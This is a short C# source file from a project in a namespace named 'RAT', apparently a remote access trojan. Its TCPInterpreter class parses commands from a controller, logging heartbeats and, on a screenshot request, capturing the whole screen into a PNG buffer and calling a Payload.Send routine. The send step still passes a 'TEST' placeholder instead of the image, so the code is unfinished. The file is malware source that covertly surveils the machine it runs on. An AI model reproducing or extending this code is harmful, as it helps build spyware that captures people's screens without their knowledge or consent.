using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RAT
{ 
    public class TCPInterpreter
    {
        public static void main(String data)
        {
            if (data.Contains("<HEARTBEAT>"))
            {
                String command = data.Substring(data.IndexOf("<HEARTBEAT>") + 12).Replace("<EOF>", "");
                Console.WriteLine("Heartbeat From " + command);
            }
            if (data.Contains("<SCREENSHOTREQ>"))
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Png);
                        byte[] imageBuffer = ms.GetBuffer();
                        Task.Run(() => Payload.Send("<SCREENSHOT> "+"TEST"));
                    }
                }
                
            }
        }
    }
}
